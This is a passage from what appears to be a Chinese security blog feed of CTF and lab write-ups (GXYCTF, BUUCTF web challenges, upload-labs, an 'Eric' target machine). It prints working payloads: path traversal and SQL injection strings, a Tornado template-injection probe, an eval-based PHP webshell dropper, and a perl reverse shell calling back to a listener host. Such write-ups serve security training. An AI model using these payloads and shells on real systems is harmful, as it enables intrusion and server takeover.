id="GXYCTF2019"><a href="#GXYCTF2019" class="headerlink" title="GXYCTF2019"></a>GXYCTF2019</h3><p>1.ping ping ping :1.$IFS$9绕过空格过滤2.变量名拼接a=l;b=s;$a$b 绕过敏感字符过滤<br>2.babysqli：1.常规的联合查询注入，猜测后端为md5比较 2.当查询的数据不存在的时候，联合查询就会构造一个虚拟的数据在数据库中<br>3.禁止套娃L:无参数RCE<br>列文件：localeconv() 函数：<br> 返回一包含本地数字及货币格式信息的数组。而数组第一项就是.<br> current() 返回数组中的当前单元, 默认取第一个值。所以current(localeconv())的值就是一个点<br> scandir(current(localeconv()))就是列出当前目录下的文件<br> 查看文件：session_id(session_start())获取到当前的session id，将session_id的值设置为我们想要看的文件名即可<br> 4.babyupload：js引用php绕过&lt;?过滤</p>]]></content>
    
    
    <categories>
      
      <category>题解</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF Web WriteUP</title>
    <link href="/2020/02/04/BUUCTF-Web-WriteUP/"/>
    <url>/2020/02/04/BUUCTF-Web-WriteUP/</url>
    
    <content type="html"><![CDATA[<!-- toc --><h3 id="0x01-Warm-Up"><a href="#0x01-Warm-Up" class="headerlink" title="0x01 Warm Up"></a>0x01 Warm Up</h3><p>第一题，开始只有一张图，查看源代码试试，发现了source.php,访问一下source.php,拿到了源码：</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span>    </span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span><span class="hljs-params">(&amp;$page)</span>        </span>&#123;            $whitelist = [<span class="hljs-string">"source"</span>=&gt;<span class="hljs-string">"source.php"</span>,<span class="hljs-string">"hint"</span>=&gt;<span class="hljs-string">"hint.php"</span>];            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>($page) || !is_string($page)) &#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">"you can't see it"</span>;                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;            &#125;            <span class="hljs-keyword">if</span> (in_array($page, $whitelist)) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;            &#125;            $_page = mb_substr(                $page,                <span class="hljs-number">0</span>,                mb_strpos($page . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)            );            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;            &#125;            $_page = urldecode($page);            $_page = mb_substr(                $_page,                <span class="hljs-number">0</span>,                mb_strpos($_page . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)            );            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;            &#125;            <span class="hljs-keyword">echo</span> <span class="hljs-string">"you can't see it"</span>;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        &#125;    &#125;    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>($_REQUEST[<span class="hljs-string">'file'</span>])        &amp;&amp; is_string($_REQUEST[<span class="hljs-string">'file'</span>])        &amp;&amp; emmm::checkFile($_REQUEST[<span class="hljs-string">'file'</span>])    ) &#123;        <span class="hljs-keyword">include</span> $_REQUEST[<span class="hljs-string">'file'</span>];        <span class="hljs-keyword">exit</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;    &#125;  <span class="hljs-meta">?&gt;</span></span></code></pre><p>在源码中还得知了有个hint.php，访问一下<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7148.JPG" srcset="/img/loading.gif" alt="picture"><br>得知flag在ffffllllaaaagggg中，于是就要想办法读取这个文件，接下来分析一下源码，关键是这段代码</p><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (! empty(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'file'</span>])        &amp;&amp; is_string(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'file'</span>])        &amp;&amp; emmm::checkFile(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'file'</span>])    ) &#123;        include <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'file'</span>];        <span class="hljs-keyword">exit</span>;</code></pre><p>只要满足传给file的值不为空且为字符串以及checkFile($_REQUEST[‘file’])的值为真，具体看一下checkfile（）这个函数，主要是个白名单验证，白名单中只有source.php和hint.php<br>然后检查$page是不是存在于白名单中，接下来再截取$page中？前的字符，并检验是否存在于白名单中，之后进行url解码再检验是否存在于白名单中，于是我们可以构造payload</p><pre><code class="hljs mel">?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">source</span>.php%253f</code></pre><p>这里%25解码为%，所以一开始浏览器会对其进行一次解码，变成source.php%3f，%3f解码之后是？，所以再一次解码后变为source.php?，顺利通关，但是我们目的是读取ffffllllaaaagggg，所以可以利用目录穿越<br>../../../../../../../../进行读取，最终payload：</p><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">source</span>.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>ffffllllaaaagggg</code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7149.JPG" srcset="/img/loading.gif" alt="picture"><br>成功拿到flag</p><!-- toc --><h3 id="0x02-随便注"><a href="#0x02-随便注" class="headerlink" title="0x02 随便注"></a>0x02 随便注</h3><p>这道题的考点应该是堆叠注入，首先列出数据库：</p><pre><code class="hljs sql">1';<span class="hljs-keyword">show</span> <span class="hljs-keyword">database</span>;<span class="hljs-comment">#</span></code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7157.JPG" srcset="/img/loading.gif" alt="picture"><br>之后列出表名</p><pre><code class="hljs sql">1';<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<span class="hljs-comment">#</span></code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7158.JPG" srcset="/img/loading.gif" alt="picture"><br>猜测flag在表一，但测试发现select是被过滤的。于是想到可以用16进制编码，还有prepare语句，即预编译语句，先prepare语句准备好一个SQL语句，并给他命名，之后调用这个名字即可<br>于是，有了如下payload：</p><pre><code class="hljs sql">1';<span class="hljs-keyword">SeT</span>@a=<span class="hljs-number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="hljs-keyword">prepare</span> execsql <span class="hljs-keyword">from</span> @a;<span class="hljs-keyword">execute</span> execsql;<span class="hljs-comment">#</span></code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7159.JPG" srcset="/img/loading.gif" alt="picture"></p><!-- toc --><h3 id="0x03-easy-tornado"><a href="#0x03-easy-tornado" class="headerlink" title="0x03  easy_tornado"></a>0x03  easy_tornado</h3><p>首先看到给出了三个txt文件，依次查看一下 ，先看一下flag.txt 得知flag在/flllllllllag发现这个时候发现url变成了:</p><pre><code class="hljs llvm">http://<span class="hljs-keyword">c</span><span class="hljs-number">446</span>f<span class="hljs-number">9</span>a<span class="hljs-number">2</span>-<span class="hljs-keyword">c</span><span class="hljs-number">632</span><span class="hljs-number">-4</span>dbe<span class="hljs-number">-91</span>f<span class="hljs-number">7</span>-fc<span class="hljs-number">8</span>fe<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">17e33</span>.node<span class="hljs-number">3</span>.buuoj.cn/file?filename=/flag.txt&amp;filehash=<span class="hljs-number">1</span>afdc<span class="hljs-number">686</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>f<span class="hljs-number">135677</span>a<span class="hljs-number">73</span>d<span class="hljs-number">6</span>b<span class="hljs-number">9610</span>db<span class="hljs-number">36</span><span class="hljs-keyword">c</span></code></pre><p>猜测有一个是要通过给filename传参，来获取flag，试了一下给filename赋值:/fllllllllllllag,报错了<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7163.JPG" srcset="/img/loading.gif" alt="picture"><br>这个时候结合hint.txt的内容：</p><pre><code class="hljs stylus">/hints<span class="hljs-selector-class">.txt</span><span class="hljs-function"><span class="hljs-title">md5</span><span class="hljs-params">(cookie_secret+md5(filename)</span></span>)</code></pre><p>猜想我们要计算/flllllllllag的filehash的值，方可让他正确回显，于是找了个计算hash的脚本</p><pre><code class="hljs #python">#!-*-coding:utf-8 -*-import hashlib def md5value(s):    md5 = hashlib.md5()     md5.update(s)     return md5.hexdigest() def jiami():     filename = &apos;/fllllllllllllag&apos;    cookie_s =&quot;&quot;    print(md5value(filename.encode(&apos;utf-8&apos;)))    x=md5value(filename.encode(&apos;utf-8&apos;))    y=cookie_s+x    print(md5value(y.encode(&apos;utf-8&apos;)))  jiami()</code></pre><p>要计算filehash我们还缺少cookie，这时注意到了welcome.txt中的提示render，原来我们报错页面的回显是可控的，在msg中传入表达式会被执行，所以想到了模板注入，去搜了搜<br>torando框架，发现了其中的handler类，它代表着业务逻辑，我们进行服务端开发时就是编写一堆一堆的handler用来服务客户端请求。<br>参考的大佬博客：<a href="https://xz.aliyun.com/t/2908" target="_blank" rel="noopener">https://xz.aliyun.com/t/2908</a><br>通过handler.application即可访问整个Tornado。</p><p>简单而言通过或者就可获得settings中的cookie_secret。<br>所以有了如下payload：</p><pre><code class="hljs aspectj">http://187e4e0a-2fe3-4a4e-a684-c4b532ad0102.node3.buuoj.cn/<span class="hljs-keyword">error</span>?msg=&#123;&#123;<span class="hljs-keyword">handler</span>.settings&#125;&#125;</code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7164.JPG" srcset="/img/loading.gif" alt="picture"><br>获取cookie——secret的值，带入脚本计算得到filehash的值<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7165.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7166.JPG" srcset="/img/loading.gif" alt="picture"></p><!-- toc --><h3 id="0x04-easysql"><a href="#0x04-easysql" class="headerlink" title="0x04  easysql"></a>0x04  easysql</h3><p>这题试了半天，发现过滤了一堆东西，所以只能找一找wp，来分析一下别人的payload：</p><pre><code class="hljs routeros">1;<span class="hljs-builtin-name">set</span> <span class="hljs-attribute">sql_mode</span>=PIPES_AS_CONCAT;select 1</code></pre><p>还有这道题的源码</p><pre><code class="hljs #php">&lt;?php    session_start();    include_once &quot;config.php&quot;;    $post = array();    $get = array();    global $MysqlLink;    //GetPara();    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);    if(!$MysqlLink)&#123;        die(&quot;Mysql Connect Error!&quot;);    &#125;    $selectDB = mysqli_select_db($MysqlLink,$dataName);    if(!$selectDB)&#123;        die(&quot;Choose Database Error!&quot;);    &#125;    foreach ($_POST as $k=&gt;$v)&#123;        if(!empty($v)&amp;&amp;is_string($v))&#123;            $post[$k] = trim(addslashes($v));        &#125;    &#125;    foreach ($_GET as $k=&gt;$v)&#123;        &#125;    &#125;    //die();    ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php    if(isset($post[&apos;query&apos;]))&#123;        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;        //var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]));        if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]))&#123;            //echo $post[&apos;query&apos;];            die(&quot;Nonono.&quot;);        &#125;        if(strlen($post[&apos;query&apos;])&gt;40)&#123;            die(&quot;Too long.&quot;);        &#125;        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;        mysqli_multi_query($MysqlLink,$sql);        do&#123;            if($res = mysqli_store_result($MysqlLink))&#123;                while($row = mysqli_fetch_row($res))&#123;                    print_r($row);                &#125;            &#125;        &#125;while(@mysqli_next_result($MysqlLink));    &#125;    ?&gt;</code></pre><p>这里系统变量@@sql_modesql_mode：是一组mysql支持的基本语法及校验规则<br>PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似<br>又注意到</p><pre><code class="hljs arcade"><span class="hljs-symbol">$s</span>ql = <span class="hljs-string">"select "</span>.<span class="hljs-symbol">$post</span>[<span class="hljs-string">'query'</span>].<span class="hljs-string">"||flag from Flag"</span>;</code></pre><p>所以当我们将sql_modesql_mode设为PIPES_AS_CONCAT之后，查询语句中的||就变成看拼接字符串的作用，查询语句也变为：</p><pre><code class="hljs sql">$sql = "<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>;<span class="hljs-keyword">set</span> sql_mode=pipes_as_concat;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>||flag <span class="hljs-keyword">from</span> Flag<span class="hljs-string">";</span></code></pre><p>这样就能查询到flag了<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7167.JPG" srcset="/img/loading.gif" alt="picture"></p>]]></content>
    
    
    <categories>
      
      <category>题解</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>upload-labs通关笔记</title>
    <link href="/2019/12/11/up-load%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    <url>/2019/12/11/up-load%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<!-- toc --><h3 id="0x01-Pass-01"><a href="#0x01-Pass-01" class="headerlink" title="0x01  Pass-01"></a>0x01  Pass-01</h3><p>这关就用js限制了只能提交JPG,PNG，GIF的格式，因为就前端限制，所以抓包改包即可,首先将要上传的木马后缀改为jpg，然后在截获上传的包将其后缀改回来即可<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B796.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B797.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B798.JPG" srcset="/img/loading.gif" alt="picture"><br>上传成功！</p><!-- toc --><h3 id="0x02-Pass-02"><a href="#0x02-Pass-02" class="headerlink" title="0x02  Pass-02"></a>0x02  Pass-02</h3><p>和前一关差不多，不过注意做之前要清空上传文件，抓包之后。改即可，不过他这题实在后台验证，不清楚为啥怎么改可以绕过，去网上查了一下发现是MIME类型检测（<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types），只要这个" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types），只要这个</a><br>Content-Type类型改成image/gif即可<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7111.JPG" srcset="/img/loading.gif" alt="picture"></p><!-- toc --><h3 id="0x03-Pass-03"><a href="#0x03-Pass-03" class="headerlink" title="0x03  Pass-03"></a>0x03  Pass-03</h3><p>这一关，它对我们的后缀做了限制，不能有asp,php.jsp,aspx等后缀名，还过滤了.和空格，并且强制转化为小写，过滤了字符串’::$DATA’,后再查阅资料，发现php还可以解析php1，php2，php3为后缀的<br>文件<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7113.JPG" srcset="/img/loading.gif" alt="picture"><br>成功绕过</p><!-- toc --><h3 id="0x04-Pass-04"><a href="#0x04-Pass-04" class="headerlink" title="0x04  Pass-04"></a>0x04  Pass-04</h3><p>在第三关的基础上还限制了php1 php2 phtml等各种罕见后缀，于是可以考虑.htaccess去绕过<br>关于什么是.htaccess:<br>htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<br>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<br>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。<br>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能<br>.htaccess文件(或者”分布式配置文件”)提供了针对每个目录改变配置的方法,意思是上传.htaccess文件和你上传的图片在一个目录下，然后你可以在.htaccess中写入特定的内容让你上传的jpg文件当作php文件执行<br>具体在.htaccess中写入的内容：</p><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch "nosafe.jpg"&gt;</span>  <span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre><p>这样上传的nosafe.jpg文件可以被当作php文件执行<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7116.JPG" srcset="/img/loading.gif" alt="picture"></p><!-- toc --><h3 id="0x05-Pass-05-Pass-08"><a href="#0x05-Pass-05-Pass-08" class="headerlink" title="0x05  Pass-05~Pass-08"></a>0x05  Pass-05~Pass-08</h3><p>第五关很简单和前两关类似，都是黑名单绕过，没有强制转化为大小写将后缀名改为phP之类的即可  </p><p>第六关没有过滤空格，可以在文件名后面加空格，windows会将空格自动去掉，所以还是按照php<br>文件执行</p><p>第七关没有删除文件末尾的点，php后面加个.可以绕过服务器端的检测，而windows会将其去掉执行</p><p>第八关没有对后缀名进行去”::$DATA”处理，利用windows特性，可在后缀名中加” ::$DATA”绕过</p><p>其实这四关都是黑名单验证也都可以用.htaccess绕过</p><!-- toc --><h3 id="0x06-Pass-09"><a href="#0x06-Pass-09" class="headerlink" title="0x06   Pass-09"></a>0x06   Pass-09</h3><p>这关在第四关的基础上还限制了.htaccess文件，不过仔细看他删文件末尾的点和首尾去空格那两个函数，deldot（）函数删除文件末尾的.，tirm函数首尾去空，那么如果我们在文件末尾加<br>. .,的话，先执行deldot函数，删除第一个点，然后执行tirm函数删掉空格，这样还剩一个.未被删除 成功绕过<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7130.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7131.JPG" srcset="/img/loading.gif" alt="picture"></p><!-- toc --><h3 id="0x07-Pass-10"><a href="#0x07-Pass-10" class="headerlink" title="0x07  Pass-10"></a>0x07  Pass-10</h3><p>这关用了一个函数从左向右匹配，匹配到php就将其删除，所以可一双写绕过，后缀改为pphphp，这样删完之后还剩下php即可绕过<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7132.JPG" srcset="/img/loading.gif" alt="picture"></p><!-- toc --><h3 id="0x08-Pass-11"><a href="#0x08-Pass-11" class="headerlink" title="0x08  Pass-11"></a>0x08  Pass-11</h3><p>这一关是白名单，然后还会把你的后缀强制改为jpg，想着用0x00截断绕过，然而一直没成功，然后去网上找了找原因，发现是PHP版本的问题，需要php&lt;5.3.4，然而我的php版本最低也有5.6.40<br>所以就一直没有成功</p><!-- toc --><h3 id="0x09-Pass-12"><a href="#0x09-Pass-12" class="headerlink" title="0x09 Pass-12"></a>0x09 Pass-12</h3><p>还是00截断，只是由于这次是POST上传的，不会自动对%00进行解码，所以需要你在16进制中自行修改</p><!-- toc --><h3 id="0x10-Pass-13"><a href="#0x10-Pass-13" class="headerlink" title="0x10 Pass-13"></a>0x10 Pass-13</h3><p>这一题是要上传图片马，因为它这里是检测你的文件头是否和jpg或者png或者gif一致，而图片马的原理就是把php代码放在图片内容的中，然后利用php的文件包含漏洞可以将图片当作php代码<br>执行，这样原先包含在图片中的php代码就可以被解析执行了，在windows下制作图片马比较简单一个简单的copy命令即可：</p><pre><code class="hljs dockerfile"><span class="hljs-keyword">copy</span><span class="bash"> test.jpg/b+nosafe.php/a webshell2.jpg</span></code></pre><p>/b表示以二进制形式合并 /a表示以ASCII形式合并，把图片马上传之后是不能直接解析的，这里要用到文件包含漏洞，事先搭建简单的有文件包含漏洞的本地环境，php代码如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> $file = $_GET[<span class="hljs-string">'page'</span>];<span class="hljs-keyword">include</span> $file; <span class="hljs-meta">?&gt;</span></code></pre><p>这个上传漏洞可以把上传的文件当作php解析，所以直接上传我们之前上传的图片马即可<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7136.JPG" srcset="/img/loading.gif" alt="picture"></p><!-- toc --><h3 id="0x11-Pass-14-15"><a href="#0x11-Pass-14-15" class="headerlink" title="0x11 Pass-14~15"></a>0x11 Pass-14~15</h3><p>pass-14用getimagesize()来检测是否为图片，还是一样的，上传个图片马即可<br>pass-15用exif_imagetype()检测，还是一样，直接上传一个图片马即可</p><!-- toc --><h3 id="0x12-Pass-16"><a href="#0x12-Pass-16" class="headerlink" title="0x12 Pass-16"></a>0x12 Pass-16</h3><p>这一关它进行了二次渲染，如果你直接上传图片马的话，它会把图片里的php代码清除掉，所以要从它这几个二次渲染的函数入手，imagecreatefromjpeg、imagecreatefrompng、imagecreatefromgif这几个图片处理函数<br>但是如果这几个函数处理的不是图片就会报错，从而不会删除里面的php代码，所以我们直接将我们要上传的php木马，后缀改为jpg，上传虽然会报错，但是你可以在upload目录下发现它已经上传成功了（注意MIME类型要改为image/jpeg）<br>之后利用文件包含漏洞即可拿到shell<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7137.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7138.JPG" srcset="/img/loading.gif" alt="picture"></p><!-- toc --><h3 id="0x13-Pass-17"><a href="#0x13-Pass-17" class="headerlink" title="0x13 Pass-17"></a>0x13 Pass-17</h3><p>这一关是条件竞争漏洞<br>基本原理：<br>条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。<br>竞争条件”发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中<br>比如这一题，通过代码审计我们可以发现，它首先是个白名单验证，若检测到不在白名单中的后缀名，则将其删除 ，我们可以利用条件竞争在php文件被删除之前就访问到他，从而执行shell。<br>具体做法：我们可以用burpsite，抓包，不断地上传php文件，然后再去浏览器中不断访问（可以用python脚本），在被删除之前访问到他就可以了<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7140.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7141.JPG" srcset="/img/loading.gif" alt="picture"><br>但是这样只是暂时能访问这个php文件，没有真正地将马上传到服务端，所以我们需要简单修改一下php代码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">"./info.php"</span>, <span class="hljs-string">"w"</span>), <span class="hljs-string">'&lt;?php @eval($_POST["pass"]) ?&gt;'</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>这样，只要我们在不断上传地过程中，访问到这个php文件，它就会你执行，它会像服务端上传名为info.php的文件内容为：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">"pass"</span>]) <span class="hljs-meta">?&gt;</span><span class="hljs-meta">?&gt;</span></code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7142.JPG" srcset="/img/loading.gif" alt="picture"><br>成功写入shell。</p><!-- toc --><h3 id="0x14-Pass-18"><a href="#0x14-Pass-18" class="headerlink" title="0x14 Pass-18"></a>0x14 Pass-18</h3><p>跟第17关差不多，都是竞争上传，只是改成了上传图片马，但是做的时候发现不对，他并没有删除我上传的图片马，变得和第13-15关一样，直接上传一个图片马即可</p>]]></content>
    
    
    <categories>
      
      <category>文件上传</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>入门级靶机实战（Eric）</title>
    <link href="/2019/12/02/%E5%85%A5%E9%97%A8%E7%BA%A7%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88Eric%EF%BC%89/"/>
    <url>/2019/12/02/%E5%85%A5%E9%97%A8%E7%BA%A7%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88Eric%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>目标：拿到在靶机中的flag<br>打开靶机，发现需要登陆，但是用户名密码都不知道，那就只能借助Kail进行渗透，获取用户名密码<br>首先要获取靶机的IP地址，因为靶机和我的Kail在同一网关下，所以扫描c段</p><pre><code class="hljs angelscript">nmap <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span></code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B732.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B733.JPG" srcset="/img/loading.gif" alt="picture"><br>发现了192.168.56.102这个可疑的IP地址，发现他还开放了80端口，所以想去浏览器上访问一下<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B734.JPG" srcset="/img/loading.gif" alt="picture"><br>发现这是一个博客，接下来想着再用nmap去具体扫描一下端口</p><pre><code class="hljs angelscript">nmap -A <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.102</span></code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B735.JPG" srcset="/img/loading.gif" alt="picture"><br>看到了.git/，那么猜测会有源码泄露，用Githack扫描一下<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B739.JPG" srcset="/img/loading.gif" alt="picture"><br>发现了admin.php和index.php，那么就去访问看看192.168.56.102/admin.php<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B741.JPG" srcset="/img/loading.gif" alt="picture"><br>发现需要用户名和密码，不过我们都已经拿到admin.php的源码了，去看看说不定可以发现什么<br>所以</p><pre><code class="hljs css"><span class="hljs-selector-tag">cat</span> <span class="hljs-selector-tag">admin</span><span class="hljs-selector-class">.php</span></code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B740.JPG" srcset="/img/loading.gif" alt="picture"><br>没想到，在源码里直接给了用户名和密码，那就登陆上去试试<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B742.JPG" srcset="/img/loading.gif" alt="picture"><br>发现了这么一个界面，看样子可以上传点东西上去，想起学长之前发过一个马，就把它上传上去，没想到没有任何过滤，上传成功了<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B743.JPG" srcset="/img/loading.gif" alt="picture"><br>虽然拿到了shell，但是发现权限不够，不知道咋办，就去看看wp，发现要反弹shell提权，可是我也不会啊，还好网上有相关的教程<br>找到一个perl命令：</p><pre><code class="hljs tcl">perl -e 'use Socket;$i=<span class="hljs-string">"192.168.56.101"</span>;$p=<span class="hljs-number">4444</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">"tcp"</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in($p,inet_aton($i))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">"&gt;&amp;S"</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">"&gt;&amp;S"</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">"&gt;&amp;S"</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">"/bin/sh -i"</span>);&#125;;'</code></pre><p>然后在主机上监听4444端口</p><pre><code class="hljs angelscript">nc -lnvp <span class="hljs-number">4444</span></code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B744.JPG" srcset="/img/loading.gif" alt="picture"><br>看来是成功了，那么接下来就是找flag，一通操作找到了第一个flag<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B745.JPG" srcset="/img/loading.gif" alt="picture"><br>flag:89340a834323<br>补充：这个flag在一开始的那个shell中就能看到，没必要那么麻烦。<br><img 